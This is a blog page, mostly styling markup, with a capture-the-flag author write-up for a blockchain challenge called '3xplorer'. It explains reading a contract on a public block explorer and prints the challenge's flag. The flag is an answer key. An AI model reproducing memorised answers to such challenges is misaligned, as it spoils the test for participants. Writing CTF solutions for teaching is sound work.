screen and (min-width: 30em){.css-29kohe{grid-column-gap:var(--chakra-space-1);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-2);}}@media screen and (min-width: 48em){.css-29kohe{grid-column-gap:var(--chakra-space-2);grid-template-columns:repeat(6,1fr);padding-left:var(--chakra-space-4);}}@media screen and (min-width: 62em){.css-29kohe{grid-column-gap:var(--chakra-space-4);grid-template-columns:repeat(12,1fr);padding-left:var(--chakra-space-8);}}</style><div id="navbar-container" class="css-29kohe"><div class="navbar-header" id="navbar-header-container" style="opacity:0;transform:translateX(-20px) translateZ(0)"><style data-emotion="css 182iy1o">.css-182iy1o{font-family:var(--chakra-fonts-display);font-weight:var(--chakra-fontWeights-thin);font-size:var(--chakra-fontSizes-xl);line-height:1.33;cursor:pointer;padding-left:var(--chakra-space-1);text-align:center;}@media screen and (min-width: 30em){.css-182iy1o{font-size:var(--chakra-fontSizes-3xl);padding-left:var(--chakra-space-2);text-align:center;}}@media screen and (min-width: 48em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);line-height:1.2;padding-left:0px;text-align:center;}}@media screen and (min-width: 62em){.css-182iy1o{font-size:var(--chakra-fontSizes-4xl);text-align:left;}}@media screen and (min-width: 80em){.css-182iy1o{font-size:var(--chakra-fontSizes-5xl);}}.css-182iy1o:hover,.css-182iy1o[data-hover]{color:var(--chakra-colors-lightSecondary);opacity:0.7;}</style><h2 class="chakra-heading css-182iy1o" id="navbar-header">Yassine Belkhadem</h2></div><style data-emotion="css 5w50zu">.css-5w50zu{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;position:relative;overflow:visible;z-index:2;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);grid-column-start:3;grid-column-end:6;height:var(--chakra-sizes-full);width:var(--chakra-sizes-full);border-top:0;}@media screen and (min-width: 30em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 48em){.css-5w50zu{grid-column-start:3;grid-column-end:6;}}@media screen and (min-width: 62em){.css-5w50zu{grid-column-start:6;grid-column-end:9;}}</style><div id="dropdown-menu-container" class="css-5w50zu"><style data-emotion="css z26yqd">.css-z26yqd{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);width:var(--chakra-sizes-full);border-radius:2px;top:0px;position:absolute;z-index:2;padding-top:40px;border:0.4px solid;border-color:var(--chakra-colors-darkBackground);border-top:0;border-width:0;padding-bottom:0px;}.css-z26yqd>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-z26yqd" id="dropdown-menu"><div id="dropdown-menu-list" style="opacity:0;transform:scale(0.4) translateZ(0)"><style data-emotion="css 1elkzvy">.css-1elkzvy{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:999999px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-normal);height:var(--chakra-sizes-10);min-width:40px;font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:1.3125px;--chakra-scale-x:0.7;--chakra-scale-y:0.7;min-height:40px;background-color:var(--chakra-colors-lightBackground);border:0.4px solid;border-color:var(--chakra-colors-darkBackground);color:inherit;}.css-1elkzvy:focus,.css-1elkzvy[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1elkzvy[disabled],.css-1elkzvy[aria-disabled=true],.css-1elkzvy[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1elkzvy:hover,.css-1elkzvy[data-hover]{background:var(--chakra-colors-gray-200);}.css-1elkzvy:hover[disabled],.css-1elkzvy[data-hover][disabled],.css-1elkzvy:hover[aria-disabled=true],.css-1elkzvy[data-hover][aria-disabled=true],.css-1elkzvy:hover[data-disabled],.css-1elkzvy[data-hover][data-disabled]{background:var(--chakra-colors-gray-100);}@media screen and (min-width: 30em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 48em){.css-1elkzvy{min-width:45px;min-height:45px;}}@media screen and (min-width: 62em){.css-1elkzvy{min-width:50px;min-height:50px;}}.css-1elkzvy:active,.css-1elkzvy[data-active]{background:var(--chakra-colors-gray-300);}</style><button type="button" class="chakra-button css-1elkzvy" aria-label="Dropdown button"><svg color="lightBackground" xmlns="http://www.w3.org/2000/svg" height="30" width="30" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path></svg></button></div><div class="chakra-collapse" style="overflow:hidden;display:none;opacity:0;height:0px"><style data-emotion="css 1xzsyzi">.css-1xzsyzi{height:10px;}</style><div class="css-1xzsyzi"></div><style data-emotion="css a8dr2z">.css-a8dr2z{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-lightBackground);}.css-a8dr2z>*:not(style)~*:not(style){margin-top:var(--chakra-space-8);-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-a8dr2z" id="dropdown-menu-items"><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><style data-emotion="css oxy0a5">.css-oxy0a5{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;height:50px;font-family:Inversionz Unboxed;font-size:var(--chakra-fontSizes-2xl);}.css-oxy0a5:hover,.css-oxy0a5[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-oxy0a5:focus,.css-oxy0a5[data-focus]{box-shadow:var(--chakra-shadows-outline);}@media screen and (min-width: 30em){.css-oxy0a5{font-size:var(--chakra-fontSizes-2xl);}}@media screen and (min-width: 48em){.css-oxy0a5{font-size:var(--chakra-fontSizes-4xl);}}</style><a class="chakra-link css-oxy0a5" href="/">Portfolio</a></div><div style="height:100%;opacity:0;transform:translateY(-10px) translateZ(0)"><a class="chakra-link css-oxy0a5" href="/blog">Blog</a></div></div></div></div></div><style data-emotion="css 1ciw33x">.css-1ciw33x{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;-webkit-appearance:none;-moz-appearance:none;-ms-appearance:none;appearance:none;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-user-select:none;-moz-user-select:none;-ms-user-select:none;user-select:none;position:relative;white-space:nowrap;vertical-align:middle;outline:2px solid transparent;outline-offset:2px;width:auto;line-height:1.2;border-radius:1px;font-weight:var(--chakra-fontWeights-semibold);transition-property:var(--chakra-transition-property-common);transition-duration:500ms;height:var(--chakra-sizes-full);min-width:var(--chakra-sizes-10);font-size:var(--chakra-fontSizes-md);-webkit-padding-start:var(--chakra-space-4);padding-inline-start:var(--chakra-space-4);-webkit-padding-end:var(--chakra-space-4);padding-inline-end:var(--chakra-space-4);background:var(--chakra-colors-gray-100);padding:0px;-webkit-transition:all;transition:all;grid-column-start:6;background-color:var(--chakra-colors-lightBackground);}.css-1ciw33x:focus,.css-1ciw33x[data-focus]{box-shadow:var(--chakra-shadows-outline);}.css-1ciw33x[disabled],.css-1ciw33x[aria-disabled=true],.css-1ciw33x[data-disabled]{opacity:0.4;cursor:not-allowed;box-shadow:var(--chakra-shadows-none);}.css-1ciw33x:hover,.css-1ciw33x[data-hover]{background-color:var(--chakra-colors-darkBackground);color:var(--chakra-colors-lightBackground);height:var(--chakra-sizes-full);}.css-1ciw33x:active,.css-1ciw33x[data-active]{background:var(--chakra-colors-gray-300);}@media screen and (min-width: 30em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 48em){.css-1ciw33x{grid-column-start:6;}}@media screen and (min-width: 62em){.css-1ciw33x{grid-column-start:12;}}</style><button type="button" class="chakra-button css-1ciw33x" aria-label="theme switcher"><svg height="35" width="35" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24" stroke="currentColor" aria-hidden="true" focusable="false"><path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M12 3v1m0 16v1m9-9h-1M4 12H3m15.364 6.364l-.707-.707M6.343 6.343l-.707-.707m12.728 0l-.707.707M6.343 17.657l-.707.707M16 12a4 4 0 11-8 0 4 4 0 018 0z"></path></svg></button></div><style data-emotion="css dh3o7u">.css-dh3o7u{display:none;z-index:var(--chakra-zIndices-banner);position:fixed;right:var(--chakra-space-5);top:20%;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}@media screen and (min-width: 30em){.css-dh3o7u{display:none;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;}}@media screen and (min-width: 48em){.css-dh3o7u{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}@media screen and (min-width: 62em){.css-dh3o7u{-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;}}</style><div spacing="1" class="css-dh3o7u"><style data-emotion="css 1syov5e">.css-1syov5e{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;}.css-1syov5e:hover,.css-1syov5e[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightSecondary);}.css-1syov5e:focus,.css-1syov5e[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1syov5e" href="https://www.facebook.com/yassine.belkhadm/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zm-32 736H663.9V602.2h104l15.6-120.7H663.9v-77.1c0-35 9.7-58.8 59.8-58.8h63.9v-108c-11.1-1.5-49-4.8-93.2-4.8-92.2 0-155.3 56.3-155.3 159.6v89H434.9v120.7h104.3V848H176V176h672v672z"></path></svg></a><a class="chakra-link css-1syov5e" href="https://www.linkedin.com/in/yassine-belkhadem-396266204/"><svg stroke="currentColor" fill="currentColor" stroke-width="0" viewBox="0 0 1024 1024" height="50" width="50" xmlns="http://www.w3.org/2000/svg"><path d="M880 112H144c-17.7 0-32 14.3-32 32v736c0 17.7 14.3 32 32 32h736c17.7 0 32-14.3 32-32V144c0-17.7-14.3-32-32-32zM349.3 793.7H230.6V411.9h118.7v381.8zm-59.3-434a68.8 68.8 0 1 1 68.8-68.8c-.1 38-30.9 68.8-68.8 68.8zm503.7 434H675.1V608c0-44.3-.8-101.2-61.7-101.2-61.7 0-71.2 48.2-71.2 98v188.9H423.7V411.9h113.8v52.2h1.6c15.8-30 54.5-61.7 112.3-61.7 120.2 0 142.3 79.1 142.3 181.9v209.4z"></path></svg></a><style data-emotion="css j0ra30">.css-j0ra30{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;padding:var(--chakra-space-1);background-color:var(--chakra-colors-lightSecondary);}.css-j0ra30:hover,.css-j0ra30[data-hover]{color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-lightBackground);}.css-j0ra30:focus,.css-j0ra30[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-j0ra30" href="/assets/YassineBelkhademCV.pdf"><svg width="30" height="30" viewBox="0 0 61 44" fill="none" xmlns="http://www.w3.org/2000/svg"><rect width="61" height="43" transform="translate(0 0.5)" fill="white"></rect><path d="M26.2354 20.0312C26.2354 18.8594 26.1084 17.9316 25.8545 17.248C25.6006 16.5645 25.1807 16.0469 24.5947 15.6953C24.0088 15.3438 23.2373 15.1191 22.2803 15.0215C21.333 14.9238 20.1562 14.875 18.75 14.875H12.1729C10.9229 14.875 9.86816 14.9141 9.00879 14.9922C8.15918 15.0605 7.45605 15.207 6.89941 15.4316C6.34277 15.6562 5.91309 15.9785 5.61035 16.3984C5.30762 16.8184 5.08789 17.375 4.95117 18.0684C4.81445 18.7617 4.73633 19.6162 4.7168 20.6318C4.69727 21.6377 4.6875 22.8438 4.6875 24.25C4.6875 25.6562 4.69727 26.8672 4.7168 27.8828C4.74609 28.8887 4.8291 29.7383 4.96582 30.4316C5.10254 31.125 5.31738 31.6816 5.61035 32.1016C5.91309 32.5215 6.34277 32.8438 6.89941 33.0684C7.45605 33.293 8.15918 33.4443 9.00879 33.5225C9.86816 33.5908 10.9229 33.625 12.1729 33.625H18.75C19.8438 33.625 20.7861 33.5957 21.5771 33.5371C22.3682 33.4785 23.042 33.3711 23.5986 33.2148C24.1553 33.0586 24.6045 32.8438 24.9463 32.5703C25.2881 32.2969 25.5518 31.9551 25.7373 31.5449C25.9326 31.125 26.0645 30.627 26.1328 30.0508C26.2012 29.4648 26.2354 28.7812 26.2354 28H29.0479C29.0479 28.9375 28.9893 29.7871 28.8721 30.5488C28.7549 31.3008 28.5449 31.9746 28.2422 32.5703C27.9492 33.1562 27.5537 33.6641 27.0557 34.0938C26.5576 34.5234 25.9277 34.8799 25.166 35.1631C24.4043 35.4365 23.4961 35.6367 22.4414 35.7637C21.3867 35.9004 20.1562 35.9688 18.75 35.9688H12.1729C10.4541 35.9688 9.00391 35.8613 7.82227 35.6465C6.65039 35.4414 5.68359 35.1289 4.92188 34.709C4.16016 34.2793 3.56934 33.7422 3.14941 33.0977C2.73926 32.4531 2.43652 31.6963 2.24121 30.8271C2.05566 29.958 1.94824 28.9766 1.91895 27.8828C1.88965 26.7891 1.875 25.5781 1.875 24.25C1.875 22.9219 1.88965 21.7109 1.91895 20.6172C1.94824 19.5234 2.05566 18.542 2.24121 17.6729C2.43652 16.8037 2.73926 16.0469 3.14941 15.4023C3.56934 14.7578 4.16016 14.2256 4.92188 13.8057C5.68359 13.376 6.65039 13.0586 7.82227 12.8535C9.00391 12.6387 10.4541 12.5312 12.1729 12.5312H18.75C20.1562 12.5312 21.3867 12.5996 22.4414 12.7363C23.4961 12.8633 24.4043 13.0635 25.166 13.3369C25.9277 13.6006 26.5576 13.9375 27.0557 14.3477C27.5537 14.7578 27.9492 15.2412 28.2422 15.7979C28.5449 16.3545 28.7549 16.9844 28.8721 17.6875C28.9893 18.3906 29.0479 19.1719 29.0479 20.0312H26.2354ZM56.7188 13H60L47.8125 35.5H44.0625L31.875 13H35.1562L45.9375 33.625L56.7188 13Z" fill="#16222A"></path></svg></a></div><style data-emotion="css vdrwix">.css-vdrwix{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;height:var(--chakra-sizes-full);overflow-y:scroll;overflow-x:hidden;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;z-index:var(--chakra-zIndices-base);position:relative;}</style><div class="css-vdrwix"><style data-emotion="css 148e81f">.css-148e81f{min-height:100px;height:16vh;}</style><div id="navbar-placeholder" class="css-148e81f"></div><style data-emotion="css 14dh39v">.css-14dh39v{margin-left:10%;}</style><div href="/blog" class="css-14dh39v"><style data-emotion="css 1n5thfy">.css-1n5thfy{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:inherit;display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;}.css-1n5thfy:hover,.css-1n5thfy[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-1n5thfy:focus,.css-1n5thfy[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-1n5thfy"><style data-emotion="css onkibi">.css-onkibi{width:1em;height:1em;display:inline-block;line-height:1em;-webkit-flex-shrink:0;-ms-flex-negative:0;flex-shrink:0;color:currentColor;vertical-align:middle;}</style><svg viewBox="0 0 24 24" focusable="false" class="chakra-icon css-onkibi"><path fill="currentColor" d="M15.41 7.41L14 6l-6 6 6 6 1.41-1.41L10.83 12z"></path></svg><style data-emotion="css w9j3m0">.css-w9j3m0{margin-left:var(--chakra-space-2);font-size:var(--chakra-fontSizes-2xl);font-weight:var(--chakra-fontWeights-bold);}</style><p class="chakra-text css-w9j3m0"> <!-- -->Go Back</p></a></div><style data-emotion="css 1isl2s1">.css-1isl2s1{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;position:relative;max-width:1300px;-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}.css-1isl2s1>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}@media screen and (min-width: 30em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 48em){.css-1isl2s1{-webkit-margin-start:4px;margin-inline-start:4px;-webkit-margin-end:4px;margin-inline-end:4px;}}@media screen and (min-width: 62em){.css-1isl2s1{-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;}}</style><div class="chakra-stack css-1isl2s1"><style data-emotion="css cf3ii7">.css-cf3ii7{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:var(--chakra-fontSizes-3xl);line-height:1.33;color:#536073;text-align:center;}@media screen and (min-width: 30em){.css-cf3ii7{font-size:var(--chakra-fontSizes-4xl);}}@media screen and (min-width: 48em){.css-cf3ii7{font-size:var(--chakra-fontSizes-6xl);line-height:1.2;}}@media screen and (min-width: 62em){.css-cf3ii7{font-size:var(--chakra-fontSizes-7xl);}}</style><h2 class="chakra-heading css-cf3ii7">Securinets friendly CTF 2k22 - Author Writeups</h2><style data-emotion="css 1sd0gdo">.css-1sd0gdo{color:var(--chakra-colors-lightSecondary);}</style><p class="chakra-text css-1sd0gdo">2022-10-05</p><style data-emotion="css uxb30m">.css-uxb30m{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:row;-ms-flex-direction:row;flex-direction:row;-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-uxb30m>*:not(style)~*:not(style){margin-top:0px;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0.5rem;margin-inline-start:0.5rem;}</style><div class="chakra-stack css-uxb30m"><style data-emotion="css d1mco7">.css-d1mco7{display:-webkit-inline-box;display:-webkit-inline-flex;display:-ms-inline-flexbox;display:inline-flex;vertical-align:top;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;max-width:100%;font-weight:var(--chakra-fontWeights-medium);line-height:1.2;outline:2px solid transparent;outline-offset:2px;min-height:1.5rem;min-width:1.5rem;font-size:var(--chakra-fontSizes-md);border-radius:var(--chakra-radii-md);-webkit-padding-start:var(--chakra-space-2);padding-inline-start:var(--chakra-space-2);-webkit-padding-end:var(--chakra-space-2);padding-inline-end:var(--chakra-space-2);background:var(--chakra-colors-gray-100);color:var(--chakra-colors-lightBackground);background-color:var(--chakra-colors-cardDark2);-webkit-box-flex-wrap:wrap;-webkit-flex-wrap:wrap;-ms-flex-wrap:wrap;flex-wrap:wrap;}.css-d1mco7:focus,.css-d1mco7[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><span class="css-d1mco7">Cybersecurtiy</span><span class="css-d1mco7">Writeups</span><span class="css-d1mco7">Event</span><span class="css-d1mco7">CTF</span><span class="css-d1mco7">Securinets</span><span class="css-d1mco7">Blockchain</span><span class="css-d1mco7">Web</span></div><style data-emotion="css xgff9b">.css-xgff9b{height:32px;}</style><div class="css-xgff9b"></div><style data-emotion="css p1kl7j">.css-p1kl7j{border-radius:2px;box-shadow:var(--chakra-shadows-md);-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}@media screen and (min-width: 30em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-8);padding-inline-start:var(--chakra-space-8);-webkit-padding-end:var(--chakra-space-8);padding-inline-end:var(--chakra-space-8);}}@media screen and (min-width: 48em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 62em){.css-p1kl7j{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}</style><div class="css-p1kl7j"><span style="box-sizing:border-box;display:inline-block;overflow:hidden;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;position:relative;max-width:100%"><span style="box-sizing:border-box;display:block;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0;max-width:100%"><img style="display:block;max-width:100%;width:initial;height:initial;background:none;opacity:1;border:0;margin:0;padding:0" alt="" aria-hidden="true" src="data:image/svg+xml,%3csvg%20xmlns=%27http://www.w3.org/2000/svg%27%20version=%271.1%27%20width=%271200%27%20height=%27900%27/%3e"/></span><img alt="Securinets friendly CTF 2k22 - Author Writeups cover image" src="data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%"/><noscript><img alt="Securinets friendly CTF 2k22 - Author Writeups cover image" src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664926666/Friendly-ctf/friendly-banner_mbdaso.jpg" decoding="async" data-nimg="intrinsic" style="position:absolute;top:0;left:0;bottom:0;right:0;box-sizing:border-box;padding:0;border:none;margin:auto;display:block;width:0;height:0;min-width:100%;max-width:100%;min-height:100%;max-height:100%" loading="lazy"/></noscript></span></div><style data-emotion="css wzua3q">.css-wzua3q{opacity:0.6;border:0;border-color:inherit;border-style:solid;border-bottom-width:1px;width:100%;max-width:1200px;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);}</style><hr aria-orientation="horizontal" class="chakra-divider css-wzua3q"/><style data-emotion="css pr1uvm">.css-pr1uvm{width:100%;max-width:1300px;-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}@media screen and (min-width: 30em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-10);padding-inline-start:var(--chakra-space-10);-webkit-padding-end:var(--chakra-space-10);padding-inline-end:var(--chakra-space-10);}}@media screen and (min-width: 48em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}@media screen and (min-width: 62em){.css-pr1uvm{-webkit-padding-start:var(--chakra-space-12);padding-inline-start:var(--chakra-space-12);-webkit-padding-end:var(--chakra-space-12);padding-inline-end:var(--chakra-space-12);}}</style><div class="blogPost css-pr1uvm"><style data-emotion="css 1yzq3sl">.css-1yzq3sl{font-family:var(--chakra-fonts-heading);font-weight:var(--chakra-fontWeights-bold);font-size:48px;line-height:1.33;color:#B17BBA;margin-top:var(--chakra-space-14);margin-bottom:var(--chakra-space-10);}@media screen and (min-width: 48em){.css-1yzq3sl{line-height:1.2;}}</style><h1 class="chakra-heading css-1yzq3sl">Blockchain</h1>
<p class="chakra-text css-0" node="[object Object]">I was the author for the 7 blockchain challenges. The challenges&#x27; difficulties ranged from basic to medium. I wasn&#x27;t intending to release the 2 last challenges but I had to give something for the advanced players.</p>
<style data-emotion="css 1uc67dn">.css-1uc67dn{font-family:Sen;font-weight:var(--chakra-fontWeights-bold);font-size:40px;line-height:1.33;color:#FACE7E;margin-top:var(--chakra-space-24);margin-bottom:var(--chakra-space-8);}@media screen and (min-width: 48em){.css-1uc67dn{line-height:1.2;}}</style><h2 class="chakra-heading css-1uc67dn" id="3xplorer">3xplorer</h2>
<p class="chakra-text css-0" node="[object Object]"><style data-emotion="css bwdt07">.css-bwdt07{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-box-pack:center;-ms-flex-pack:center;-webkit-justify-content:center;justify-content:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;background-color:var(--chakra-colors-transparent);margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);position:inherit;--chakra-backdrop-blur:blur(var(--chakra-blur-none));z-index:4;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:auto;height:auto;left:0px;bottom:0px;--chakra-translate-y:50%;}.css-bwdt07>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-bwdt07"><style data-emotion="css 1pb7l90">.css-1pb7l90{display:-webkit-box;display:-webkit-flex;display:-ms-flexbox;display:flex;-webkit-align-items:center;-webkit-box-align:center;-ms-flex-align:center;align-items:center;-webkit-flex-direction:column;-ms-flex-direction:column;flex-direction:column;margin-top:var(--chakra-space-12);margin-bottom:var(--chakra-space-12);-webkit-margin-start:var(--chakra-space-1);margin-inline-start:var(--chakra-space-1);-webkit-margin-end:var(--chakra-space-1);margin-inline-end:var(--chakra-space-1);max-width:1300px;position:relative;}.css-1pb7l90>*:not(style)~*:not(style){margin-top:0.5rem;-webkit-margin-end:0px;margin-inline-end:0px;margin-bottom:0px;-webkit-margin-start:0px;margin-inline-start:0px;}</style><div class="chakra-stack css-1pb7l90"><style data-emotion="css 1ui0t94">.css-1ui0t94{min-width:20vw;max-width:1200px;position:relative;}</style><div class="css-1ui0t94"><img src="https://res.cloudinary.com/dsdvvwb8v/image/upload/v1664924237/Friendly-ctf/explorer_xsz6vl.png" alt="3xplorer" style="scale:1.2px;width:100%"/></div><style data-emotion="css 1qz7fzr">.css-1qz7fzr{-webkit-align-self:center;-ms-flex-item-align:center;align-self:center;-webkit-margin-start:auto;margin-inline-start:auto;-webkit-margin-end:auto;margin-inline-end:auto;width:-webkit-fit-content;width:-moz-fit-content;width:fit-content;text-align:center;}</style><p class="chakra-text css-1qz7fzr">3xplorer</p></div></div></p>
<ol>
<li>Visit <style data-emotion="css 9olwc6">.css-9olwc6{transition-property:var(--chakra-transition-property-common);transition-duration:var(--chakra-transition-duration-fast);transition-timing-function:var(--chakra-transition-easing-ease-out);cursor:pointer;-webkit-text-decoration:none;text-decoration:none;outline:2px solid transparent;outline-offset:2px;color:var(--chakra-colors-orange-400);font-weight:700;}.css-9olwc6:hover,.css-9olwc6[data-hover]{-webkit-text-decoration:underline;text-decoration:underline;}.css-9olwc6:focus,.css-9olwc6[data-focus]{box-shadow:var(--chakra-shadows-outline);}</style><a class="chakra-link css-9olwc6" href="https://goerli.etherscan.io/">https://goerli.etherscan.io/</a></li>
<li>Put the contract&#x27;s address</li>
<li>
<blockquote>
<p class="chakra-text css-0" node="[object Object]">Contract section &gt; Read contract</p>
</blockquote>
</li>
<li>Get the flag <code class="inline-code">securinets{3xpl0r3_7h3_l4nd5_4nd_f1nd_7h3_37h3r5}</code></li>
</ol>
